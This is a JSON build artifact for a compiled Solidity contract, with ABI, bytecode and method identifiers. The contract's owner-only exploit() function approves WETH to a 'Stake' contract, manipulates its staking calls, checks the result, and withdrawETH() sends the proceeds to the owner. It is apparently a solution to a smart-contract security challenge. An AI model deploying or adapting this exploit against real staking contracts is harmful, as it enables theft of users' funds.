{"abi":[{"type":"constructor","inputs":[{"name":"_stake","type":"address","internalType":"address"},{"name":"_weth","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"stake","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IStake"}],"stateMutability":"view"},{"type":"function","name":"weth","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IWETH"}],"stateMutability":"view"},{"type":"function","name":"withdrawETH","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610587380380610587833981016040819052602b916084565b5f80546001600160a01b039384166001600160a01b031991821617909155600180549290931691811691909117909155600280549091163317905560b0565b80516001600160a01b0381168114607f575f5ffd5b919050565b5f5f604083850312156094575f5ffd5b609b83606a565b915060a760208401606a565b90509250929050565b6104ca806100bd5f395ff3fe60806040526004361061005b575f3560e01c806363d9b7701161004157806363d9b770146100bf5780638da5cb5b146100d5578063e086e5ec146100f4575f5ffd5b80633a4b66f1146100665780633fc8cef3146100a0575f5ffd5b3661006257005b5f5ffd5b348015610071575f5ffd5b505f54610084906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100ab575f5ffd5b50600154610084906001600160a01b031681565b3480156100ca575f5ffd5b506100d3610108565b005b3480156100e0575f5ffd5b50600254610084906001600160a01b031681565b3480156100ff575f5ffd5b506100d36103d7565b6002546001600160a01b031633146101545760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064015b60405180910390fd5b6001545f546040517f095ea7b30000000000000000000000000000000000000000000000000000000081526001600160a01b039182166004820152670de0b6b3a76400006024820181905292919091169063095ea7b3906044016020604051808303815f875af11580156101ca573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101ee9190610457565b505f80546040517f6e35c740000000000000000000000000000000000000000000000000000000008152600481018490526001600160a01b0390911690636e35c740906024016020604051808303815f875af1158015610250573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102749190610457565b5f80546040517f7b23331900000000000000000000000000000000000000000000000000000000815230600482015292935090916001600160a01b0390911690637b23331990602401602060405180830381865afa1580156102d8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102fc919061047d565b905082811461034d5760405162461bcd60e51b815260206004820152600e60248201527f4578706c6f6974206661696c6564000000000000000000000000000000000000604482015260640161014b565b5f546040517ff1f1db1e000000000000000000000000000000000000000000000000000000008152600481018590526001600160a01b039091169063f1f1db1e906024016020604051808303815f875af11580156103ad573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103d19190610457565b50505050565b6002546001600160a01b0316331461041e5760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b604482015260640161014b565b6002546040516001600160a01b03909116904780156108fc02915f818181858888f19350505050158015610454573d5f5f3e3d5ffd5b50565b5f60208284031215610467575f5ffd5b81518015158114610476575f5ffd5b9392505050565b5f6020828403121561048d575f5ffd5b505191905056fea264697066735822122054cc6cf1c861e656b426399633f678519a9a33828c0e5cc8f8e6a18aa01e9a2e64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770","owner()":"8da5cb5b","stake()":"3a4b66f1","weth()":"3fc8cef3","withdrawETH()":"e086e5ec"},"id":0}